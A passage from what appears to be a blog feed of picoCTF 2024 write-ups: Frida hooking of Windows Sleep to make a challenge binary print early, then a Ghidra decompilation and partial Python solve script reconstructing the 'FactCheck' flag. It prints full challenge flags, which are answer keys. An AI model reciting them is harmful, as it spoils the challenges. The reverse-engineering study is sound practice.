class="title function_">onLeave</span>(<span class="params">log, retval, state</span>) &#123;</span><br><span class="line">    <span class="title function_">log</span>(<span class="string">&quot;Sleep function completed&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>After modifying &amp; saving, we can re-run <code>frida-trace</code> and see if it works:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\river\Desktop\ctf\pico\BinaryInstrumentation1 &gt; frida-trace -i Sleep -f .\bininst1.exe</span><br><span class="line">Instrumenting...</span><br><span class="line">Sleep: Loaded handler at &quot;C:\Users\river\Desktop\ctf\pico\BinaryInstrumentation1\__handlers__\KERNELBASE.dll\Sleep.js&quot;</span><br><span class="line">Sleep: Loaded handler at &quot;C:\Users\river\Desktop\ctf\pico\BinaryInstrumentation1\__handlers__\KERNEL32.DLL\Sleep.js&quot;</span><br><span class="line">Started tracing 2 functions. Web UI available at http://localhost:51063/</span><br><span class="line">Hi, I have the flag for you just right here!</span><br><span class="line">I&#x27;ll just take a quick nap before I print it out for you, should only take me a decade or so!</span><br><span class="line">zzzzzzzz....</span><br><span class="line">Ok, I&#x27;m Up! The flag is: cGljb0NURnt3NGtlX20zX3VwX3cxdGhfZnIxZGFfZjI3YWNjMzh9</span><br><span class="line">           /* TID 0x106c */</span><br><span class="line">    16 ms  Sleep()</span><br><span class="line">    16 ms     | Sleep(0xfffffffe) - Original duration: -2 ms</span><br><span class="line">    16 ms     | Sleep duration changed to 0 ms</span><br><span class="line">    16 ms  Sleep function completed</span><br><span class="line">    16 ms  Sleep()</span><br><span class="line">    16 ms     | Sleep(0xfffffffe) - Original duration: -2 ms</span><br><span class="line">    16 ms     | Sleep duration changed to 0 ms</span><br><span class="line">    16 ms  Sleep function completed</span><br><span class="line">...</span><br><span class="line">Process terminated</span><br><span class="line">FLARE-VM 05/02/2025 19:24:13</span><br></pre></td></tr></table></figure><blockquote><p>Interestingly, the original duration was -2ms, which would have taken forever</p></blockquote><p>The flag looks like it’s encoded via base64, you can either put it through <a href="https://gchq.github.io/CyberChef/">CyberChef</a> or decode it the cool way:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[marcial@arch ~/desktop/cyber/pico/binaryinstrumentation1]$ echo &quot;cGljb0NURnt3NGtlX20zX3VwX3cxdGhfZnIxZGFfZjI3YWNjMzh9&quot; | base64 -d </span><br><span class="line">picoCTF&#123;w4ke_m3_up_w1th_fr1da_f27acc38&#125;</span><br></pre></td></tr></table></figure><p>flag: <code>picoCTF&#123;w4ke_m3_up_w1th_fr1da_f27acc38&#125;</code></p>]]></content>
    
    
    <summary type="html">Bypassing sleep functions using Frida</summary>
    
    
    
    <category term="CTF" scheme="https://rivers.sh/categories/CTF/"/>
    
    <category term="picoCTF2024" scheme="https://rivers.sh/categories/CTF/picoCTF2024/"/>
    
    
    <category term="Medium" scheme="https://rivers.sh/tags/Medium/"/>
    
    <category term="Reverse Engineering" scheme="https://rivers.sh/tags/Reverse-Engineering/"/>
    
    <category term="Frida" scheme="https://rivers.sh/tags/Frida/"/>
    
    <category term="Binary Instrumentation" scheme="https://rivers.sh/tags/Binary-Instrumentation/"/>
    
    <category term="JavaScript" scheme="https://rivers.sh/tags/JavaScript/"/>
    
    <category term="Windows API" scheme="https://rivers.sh/tags/Windows-API/"/>
    
  </entry>
  
  <entry>
    <title>FactCheck</title>
    <link href="https://rivers.sh/posts/factcheck/"/>
    <id>https://rivers.sh/posts/factcheck/</id>
    <published>2025-04-23T04:00:00.000Z</published>
    <updated>2025-05-02T23:40:43.560Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Challenge-Info"><a href="#Challenge-Info" class="headerlink" title="Challenge Info"></a>Challenge Info</h2><p>This binary is putting together some important piece of information… Can you uncover that information?<br>Examine this <a href="https://artifacts.picoctf.net/c_titan/188/bin">file</a>. Do you understand its inner workings?</p><h2 id="Basic-forensics-info"><a href="#Basic-forensics-info" class="headerlink" title="Basic forensics &amp; info"></a>Basic forensics &amp; info</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[marcial@arch ~/desktop/cyber/pico/FactCheck]$ file bin                </span><br><span class="line">bin: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ed9d01aa375e575eb2cd16506aa83d6951841f87, for GNU/Linux 3.2.0, not stripped</span><br></pre></td></tr></table></figure><p>Basic info, we see we’re dealing with a non-stripped, 64-bit, linux executable.</p><p>Running <code>strings</code> and grepping for “flag” yields something interesting:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[marcial@arch ~/desktop/cyber/pico/FactCheck]$ strings bin | grep &quot;pico&quot;</span><br><span class="line">picoCTF&#123;wELF_d0N3_mate_</span><br><span class="line">[marcial@arch ~/desktop/cyber/pico/FactCheck]$</span><br></pre></td></tr></table></figure><p>Just like that, it looks like we have at least half our flag.</p><h2 id="Examining-in-Ghidra"><a href="#Examining-in-Ghidra" class="headerlink" title="Examining in Ghidra"></a>Examining in Ghidra</h2><p>After running “analyze all” in Ghidra, my go-to is to check the symbol tree, specifically for functions. I noticed a <code>FUN_00101020</code> function, which looked interesting, but didn’t yield anything. After just clicking and glancing at all of them, the one that caught my eye was <code>main</code>:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* WARNING: Removing unreachable block (ram,0x0010170c) */</span></span><br><span class="line"></span><br><span class="line"><span class="function">undefined8 <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> cVar1;</span><br><span class="line">  <span class="type">char</span> *pcVar2;</span><br><span class="line">  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line">  allocator local_249;</span><br><span class="line">  string local_248 [<span class="number">32</span>];</span><br><span class="line">  string local_228 [<span class="number">32</span>];</span><br><span class="line">  string local_208 [<span class="number">32</span>];</span><br><span class="line">  string local_<span class="number">1e8</span> [<span class="number">32</span>];</span><br><span class="line">  string local_1c8 [<span class="number">32</span>];</span><br><span class="line">  string local_1a8 [<span class="number">32</span>];</span><br><span class="line">  string local_188 [<span class="number">32</span>];</span><br><span class="line">  string local_168 [<span class="number">32</span>];</span><br><span class="line">  string local_148 [<span class="number">32</span>];</span><br><span class="line">  string local_128 [<span class="number">32</span>];</span><br><span class="line">  string local_108 [<span class="number">32</span>];</span><br><span class="line">  string local_e8 [<span class="number">32</span>];</span><br><span class="line">  string local_c8 [<span class="number">32</span>];</span><br><span class="line">  string local_a8 [<span class="number">32</span>];</span><br><span class="line">  string local_88 [<span class="number">32</span>];</span><br><span class="line">  string local_68 [<span class="number">32</span>];</span><br><span class="line">  string local_48 [<span class="number">40</span>];</span><br><span class="line">  <span class="type">long</span> local_20;</span><br><span class="line">  </span><br><span class="line">  local_20 = *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>();</span><br><span class="line">                      <span class="comment">/* try &#123; // try from 001012cf to 001012d3 has its CatchHandler @ 00101975 */</span></span><br><span class="line">  std::string::<span class="built_in">string</span>(local_248,<span class="string">&quot;picoCTF&#123;wELF_d0N3_mate_&quot;</span>,&amp;local_249);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>((allocator&lt;<span class="type">char</span>&gt; *)&amp;local_249);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>();</span><br><span class="line">                      <span class="comment">/* try &#123; // try from 0010130a to 0010130e has its CatchHandler @ 00101996 */</span></span><br><span class="line">  std::string::<span class="built_in">string</span>(local_228,<span class="string">&quot;7&quot;</span>,&amp;local_249);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>((allocator&lt;<span class="type">char</span>&gt; *)&amp;local_249);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>();</span><br><span class="line">                      <span class="comment">/* try &#123; // try from 00101345 to 00101349 has its CatchHandler @ 001019b1 */</span></span><br><span class="line">  std::string::<span class="built_in">string</span>(local_208,<span class="string">&quot;5&quot;</span>,&amp;local_249);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>((allocator&lt;<span class="type">char</span>&gt; *)&amp;local_249);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>();</span><br><span class="line">                      <span class="comment">/* try &#123; // try from 00101380 to 00101384 has its CatchHandler @ 001019cc */</span></span><br><span class="line">  std::string::<span class="built_in">string</span>(local_<span class="number">1e8</span>,<span class="string">&quot;4&quot;</span>,&amp;local_249);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>((allocator&lt;<span class="type">char</span>&gt; *)&amp;local_249);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>();</span><br><span class="line">                      <span class="comment">/* try &#123; // try from 001013bb to 001013bf has its CatchHandler @ 001019e7 */</span></span><br><span class="line">  std::string::<span class="built_in">string</span>(local_1c8,<span class="string">&quot;3&quot;</span>,&amp;local_249);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>((allocator&lt;<span class="type">char</span>&gt; *)&amp;local_249);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>();</span><br><span class="line">                      <span class="comment">/* try &#123; // try from 001013f6 to 001013fa has its CatchHandler @ 00101a02 */</span></span><br><span class="line">  std::string::<span class="built_in">string</span>(local_1a8,<span class="string">&quot;6&quot;</span>,&amp;local_249);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>((allocator&lt;<span class="type">char</span>&gt; *)&amp;local_249);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>();</span><br><span class="line">                      <span class="comment">/* try &#123; // try from 00101431 to 00101435 has its CatchHandler @ 00101a1d */</span></span><br><span class="line">  std::string::<span class="built_in">string</span>(local_188,<span class="string">&quot;9&quot;</span>,&amp;local_249);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>((allocator&lt;<span class="type">char</span>&gt; *)&amp;local_249);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>();</span><br><span class="line">                      <span class="comment">/* try &#123; // try from 0010146c to 00101470 has its CatchHandler @ 00101a38 */</span></span><br><span class="line">  std::string::<span class="built_in">string</span>(local_168,<span class="string">&quot;a&quot;</span>,&amp;local_249);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>((allocator&lt;<span class="type">char</span>&gt; *)&amp;local_249);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>();</span><br><span class="line">                      <span class="comment">/* try &#123; // try from 001014a7 to 001014ab has its CatchHandler @ 00101a53 */</span></span><br><span class="line">  std::string::<span class="built_in">string</span>(local_148,<span class="string">&quot;e&quot;</span>,&amp;local_249);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>((allocator&lt;<span class="type">char</span>&gt; *)&amp;local_249);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>();</span><br><span class="line">                      <span class="comment">/* try &#123; // try from 001014e2 to 001014e6 has its CatchHandler @ 00101a6e */</span></span><br><span class="line">  std::string::<span class="built_in">string</span>(local_128,<span class="string">&quot;3&quot;</span>,&amp;local_249);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>((allocator&lt;<span class="type">char</span>&gt; *)&amp;local_249);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>();</span><br><span class="line">                      <span class="comment">/* try &#123; // try from 0010151d to 00101521 has its CatchHandler @ 00101a89 */</span></span><br><span class="line">  std::string::<span class="built_in">string</span>(local_108,<span class="string">&quot;d&quot;</span>,&amp;local_249);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>((allocator&lt;<span class="type">char</span>&gt; *)&amp;local_249);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>();</span><br><span class="line">                      <span class="comment">/* try &#123; // try from 00101558 to 0010155c has its CatchHandler @ 00101aa4 */</span></span><br><span class="line">  std::string::<span class="built_in">string</span>(local_e8,<span class="string">&quot;b&quot;</span>,&amp;local_249);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>((allocator&lt;<span class="type">char</span>&gt; *)&amp;local_249);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>();</span><br><span class="line">                      <span class="comment">/* try &#123; // try from 00101593 to 00101597 has its CatchHandler @ 00101abf */</span></span><br><span class="line">  std::string::<span class="built_in">string</span>(local_c8,<span class="string">&quot;1&quot;</span>,&amp;local_249);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>((allocator&lt;<span class="type">char</span>&gt; *)&amp;local_249);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>();</span><br><span class="line">                      <span class="comment">/* try &#123; // try from 001015ce to 001015d2 has its CatchHandler @ 00101ada */</span></span><br><span class="line">  std::string::<span class="built_in">string</span>(local_a8,<span class="string">&quot;6&quot;</span>,&amp;local_249);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>((allocator&lt;<span class="type">char</span>&gt; *)&amp;local_249);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>();</span><br><span class="line">                      <span class="comment">/* try &#123; // try from 00101606 to 0010160a has its CatchHandler @ 00101af5 */</span></span><br><span class="line">  std::string::<span class="built_in">string</span>(local_88,<span class="string">&quot;e&quot;</span>,&amp;local_249);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>((allocator&lt;<span class="type">char</span>&gt; *)&amp;local_249);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>();</span><br><span class="line">                      <span class="comment">/* try &#123; // try from 0010163e to 00101642 has its CatchHandler @ 00101b0d */</span></span><br><span class="line">  std::string::<span class="built_in">string</span>(local_68,<span class="string">&quot;c&quot;</span>,&amp;local_249);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>((allocator&lt;<span class="type">char</span>&gt; *)&amp;local_249);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>();</span><br><span class="line">                      <span class="comment">/* try &#123; // try from 00101676 to 0010167a has its CatchHandler @ 00101b25 */</span></span><br><span class="line">  std::string::<span class="built_in">string</span>(local_48,<span class="string">&quot;8&quot;</span>,&amp;local_249);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>((allocator&lt;<span class="type">char</span>&gt; *)&amp;local_249);</span><br><span class="line">                      <span class="comment">/* try &#123; // try from 00101699 to 0010185f has its CatchHandler @ 00101b3d */</span></span><br><span class="line">  pcVar2 = (<span class="type">char</span> *)std::string::<span class="keyword">operator</span>[]((ulong)local_208);</span><br><span class="line">  <span class="keyword">if</span> (*pcVar2 &lt; <span class="string">&#x27;B&#x27;</span>) &#123;</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(local_248,local_c8);</span><br><span class="line">  &#125;</span><br><span class="line">  pcVar2 = (<span class="type">char</span> *)std::string::<span class="keyword">operator</span>[]((ulong)local_a8);</span><br><span class="line">  <span class="keyword">if</span> (*pcVar2 != <span class="string">&#x27;A&#x27;</span>) &#123;</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(local_248,local_68);</span><br><span class="line">  &#125;</span><br><span class="line">  pcVar2 = (<span class="type">char</span> *)std::string::<span class="keyword">operator</span>[]((ulong)local_1c8);</span><br><span class="line">  cVar1 = *pcVar2;</span><br><span class="line">  pcVar2 = (<span class="type">char</span> *)std::string::<span class="keyword">operator</span>[]((ulong)local_148);</span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">int</span>)cVar1 - (<span class="type">int</span>)*pcVar2 == <span class="number">3</span>) &#123;</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(local_248,local_1c8);</span><br><span class="line">  &#125;</span><br><span class="line">  std::string::<span class="keyword">operator</span>+=(local_248,local_<span class="number">1e8</span>);</span><br><span class="line">  std::string::<span class="keyword">operator</span>+=(local_248,local_188);</span><br><span class="line">  pcVar2 = (<span class="type">char</span> *)std::string::<span class="keyword">operator</span>[]((ulong)local_168);</span><br><span class="line">  <span class="keyword">if</span> (*pcVar2 == <span class="string">&#x27;G&#x27;</span>) &#123;</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(local_248,local_168);</span><br><span class="line">  &#125;</span><br><span class="line">  std::string::<span class="keyword">operator</span>+=(local_248,local_1a8);</span><br><span class="line">  std::string::<span class="keyword">operator</span>+=(local_248,local_88);</span><br><span class="line">  std::string::<span class="keyword">operator</span>+=(local_248,local_228);</span><br><span class="line">  std::string::<span class="keyword">operator</span>+=(local_248,local_128);</span><br><span class="line">  std::string::<span class="keyword">operator</span>+=(local_248,<span class="string">&#x27;&#125;&#x27;</span>);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(local_48);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(local_68);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(local_88);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(local_a8);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(local_c8);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(local_e8);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(local_108);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(local_128);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(local_148);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(local_168);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(local_188);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(local_1a8);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(local_1c8);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(local_<span class="number">1e8</span>);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(local_208);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(local_228);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(local_248);</span><br><span class="line">  <span class="keyword">if</span> (local_20 == *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">                      <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">  __stack_chk_fail();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Starts by declaring a number of C++ string variables (<code>local_248</code>, <code>local_228</code>, etc.)</li><li>Initializes the first string (<code>local_248)</code> with the partial flag we saw earlier: <code>&quot;picoCTF&#123;wELF_d0N3_mate_&#125;&quot;</code>)</li><li>Additionally, there’s a series of unconditionaly statements that append certain characters to the flag, but based on specific conditions, which I’ll cover more in the next section</li></ul><h2 id="Flag-construction-logic-solution"><a href="#Flag-construction-logic-solution" class="headerlink" title="Flag construction logic &amp; solution"></a>Flag construction logic &amp; solution</h2><p>The flag’s construction logic:</p><ul><li>If the value at index 0 of <code>local_208</code> (“5”) is less than ‘B’, append <code>local_c8</code> (“1”) - this condition is true</li><li>If the value at index 0 of <code>local_a8</code> (“6”) is not ‘A’, append <code>local_68</code> (“c”) - this condition is true</li><li>If the difference between the value at index 0 of <code>local_1c8</code> (“3”) and <code>local_148</code> (“e”) equals 3, append <code>local_1c8</code> (“3”) - this needs calculation</li><li>Unconditionally append <code>local_1e8</code> (“4”)</li><li>Unconditionally append <code>local_188</code> (“9”)</li><li>If the value at index 0 of <code>local_168</code> (“a”) is ‘G’, append local_168 (“a”) - this condition is false</li><li>Unconditionally append local_1a8 (“6”)</li><li>Unconditionally append local_88 (“e”)</li><li>Unconditionally append local_228 (“7”)</li><li>Unconditionally append local_128 (“3”)</li><li>Unconditionally append “}” to close the flag</li></ul><p>The solve script I used: </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_picoctf</span>():</span><br><span class="line">    flag = <span class="string">&quot;picoCTF&#123;wELF_d0N3_mate_&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Define all the character variables as they appeared in Ghidra</span></span><br><span class="line">    char_map = &#123;</span><br><span class="line">        <span class="string">&#x27;local_248&#x27;</span>: <span class="string">&quot;picoCTF&#123;wELF_d0N3_mate_&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;local_228&#x27;</span>: <span class="string">&quot;7&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;local_208&#x27;</span>: <span class="string">&quot;5&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;local_1e8&#x27;</span>: <span class="string">&quot;4&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;local_1c8&#x27;</span>: <span class="string">&quot;3&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;local_1a8&#x27;</span>: <span class="string">&quot;6&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;local_188&#x27;</span>: <span class="string">&quot;9&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;local_168&#x27;</span>: <span class="string">&quot;a&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;local_148&#x27;</span>: <span class="string">&quot;e&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;local_128&#x27;</span>: <span class="string">&quot;3&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;local_108&#x27;</span>: <span class="string">&quot;d&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;local_e8&#x27;</span>: <span class="string">&quot;b&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;local_c8&#x27;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;local_a8&#x27;</span>: <span class="string">&quot;6&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;local_88&#x27;</span>: <span class="string">&quot;e&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;local_68&#x27;</span>: <span class="string">&quot;c&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;local_48&#x27;</span>: <span class="string">&quot;8&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Follow the logic in the decompiled code</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># If the value at index 0 of local_208 (&quot;5&quot;) is less than &#x27;B&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> char_map[<span class="string">&#x27;local_208&#x27;</span>][<span class="number">0</span>] &lt; <span class="string">&#x27;B&#x27;</span>:</span><br><span class="line">        flag += char_map[<span class="string">&#x27;local_c8&#x27;</span>]  <span class="comment"># Append &quot;1&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># If the value at index 0 of local_a8 (&quot;6&quot;) is not &#x27;A&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> char_map[<span class="string">&#x27;local_a8&#x27;</span>][<span class="number">0</span>] != <span class="string">&#x27;A&#x27;</span>:</span><br><span class="line">        flag += char_map[<span class="string">&#x27;local_68&#x27;</span>]  <span class="comment"># Append &quot;c&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># If the difference between the value at index 0 of local_1c8 (&quot;3&quot;) and local_148 (&quot;e&quot;) equals 3</span></span><br><span class="line">    <span class="comment"># ASCII &#x27;3&#x27; is 51, ASCII &#x27;e&#x27; is 101, difference = -50, not 3, so this condition is false</span></span><br><span class="line">    <span class="keyword">if</span> <span 